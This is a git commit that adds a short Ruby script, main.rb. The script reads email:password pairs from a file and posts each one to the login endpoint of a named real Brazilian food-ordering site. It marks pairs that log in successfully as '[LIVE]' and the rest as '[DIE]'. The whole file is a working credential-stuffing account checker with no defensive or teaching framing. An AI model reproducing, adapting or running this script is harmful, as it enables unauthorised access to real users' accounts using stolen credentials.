b3c960785f60034158c801e24132fdcdd2d10d04
luan devecchi <sillonfox@live.com>
2018-01-06 14:21:19 -0200

    upload

---
+++ main.rb
@@ -0,0 +1,24 @@
+require 'uri'
+require 'net/http'
+
+
+uri = URI('https://www.pedidosja.com.br/user/doLogin')
+
+
+
+
+
+file='mylist.txt'
+File.readlines(file).each do |line|
+  splitfields = line.split(":")
+  senhafix = splitfields[1].gsub("\n" , "")
+  res = Net::HTTP.post_form(uri, 'email' => splitfields[0], 'password' => senhafix)
+	
+	if res.body.include? 'true,"userId":'
+   	puts "[LIVE] #{splitfields[0]} #{splitfields[1]}"
+   	else
+   	puts "[DIE] #{splitfields[0]} #{splitfields[1]}"
+	end
+end
+
+puts'the end.'
